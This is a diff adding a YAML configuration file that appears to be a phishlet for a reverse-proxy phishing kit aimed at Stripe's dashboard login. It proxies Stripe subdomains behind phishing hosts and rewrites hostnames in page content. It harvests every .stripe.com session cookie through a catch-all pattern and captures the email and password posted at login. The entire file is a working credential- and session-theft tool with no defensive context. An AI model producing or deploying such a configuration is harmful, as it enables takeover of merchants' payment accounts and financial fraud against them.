@@ -1,0 +1,31 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'dashboard', orig_sub: 'dashboard', domain: 'stripe.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'stripe.com', session: true, is_landing: true}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 'b', orig_sub: 'b', domain: 'stripecdn.com', session: false, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 'support', orig_sub: 'support', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 't', orig_sub: 't', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 'r', orig_sub: 'r', domain: 'stripe.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'dashboard.stripe.com', orig_sub: 'dashboard', domain: 'stripe.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripe.com', orig_sub: '', domain: 'stripe.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.stripe.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '.*/dashboard/.*'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'dashboard.stripe.com'
+  path: '/login' 
